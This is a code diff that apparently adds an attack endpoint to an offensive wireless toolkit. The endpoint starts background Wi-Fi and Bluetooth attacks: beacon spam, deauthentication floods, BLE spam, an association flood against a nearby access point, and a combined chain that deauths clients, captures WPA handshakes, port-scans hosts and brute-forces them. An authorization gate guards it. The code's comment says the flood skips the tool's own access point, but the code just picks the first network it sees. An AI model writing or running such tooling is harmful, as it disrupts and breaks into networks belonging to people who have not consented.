@@ -217,3 +217,56 @@ def kuroshuna_authorize(req: schemas.KuroshunaAuthorizeRequest):
     else:
         allowed, reason = gate.is_authorized(req.target, req.action)
     return schemas.KuroshunaAuthorizeResponse(allowed=allowed, reason=reason)
+
+
+# ---------------------------------------------------------------------------
+# Kuroshuna broadcast attack endpoint
+# ---------------------------------------------------------------------------
+
+_BROADCAST_ATTACKS = {"gemini", "deauth", "aoi", "rengoku", "bankai"}
+
+
+@router.post("/kuroshuna/broadcast", response_model=schemas.BroadcastAttackResponse)
+def kuroshuna_broadcast(req: schemas.BroadcastAttackRequest):
+    name = (req.attack or "").lower()
+    if name not in _BROADCAST_ATTACKS:
+        raise HTTPException(status_code=400, detail=f"unknown attack: {name}")
+    gate = Gate()
+    allowed, why = gate.broadcast_allowed()
+    if not allowed:
+        raise HTTPException(status_code=409, detail=why)
+    _launch_broadcast(name)            # background thread; time-boxed inside
+    return schemas.BroadcastAttackResponse(started=True, attack=name)
+
+
+def _launch_broadcast(name: str) -> None:
+    import threading
+    def _run():
+        try:
+            from kuma_core.authz import Gate as _G
+            from offense.rf_broadcast import BroadcastRF
+            g = _G()
+            rf = BroadcastRF(gate=g)
+            if name == "gemini":   rf.beacon_spam()
+            elif name == "deauth": rf.deauth_flood()
+            elif name == "aoi":    rf.ble_spam()
+            elif name == "rengoku":
+                # flood the most-recently-seen non-own AP, if any
+                nets = database.get_networks(limit=50)
+                tgt = next((n["bssid"] for n in nets if n.get("bssid")), None)
+                if tgt: rf.assoc_flood(tgt)
+            elif name == "bankai":
+                from offense import bankai
+                from offense.rf_targeted import TargetedRF
+                from offense.net_offense import NetworkOffense
+                trf, no = TargetedRF(gate=g), NetworkOffense(gate=g)
+                nets = database.get_networks(limit=200)
+                bankai.run_bankai(
+                    g, observed=nets, lan_hosts=[],
+                    rf_deauth=lambda b: trf.deauth(b),
+                    rf_capture=lambda b, ch: trf.capture_handshake(b, ch, timeout=5),
+                    net_scan=lambda h: no.scan(h).open_ports if no.scan(h).ok else [],
+                    net_brute=lambda h, p: no.bruteforce(h, p))
+        except Exception as e:  # noqa: BLE001
+            print(f"[broadcast:{name}] error: {e}", flush=True)
+    threading.Thread(target=_run, daemon=True).start()
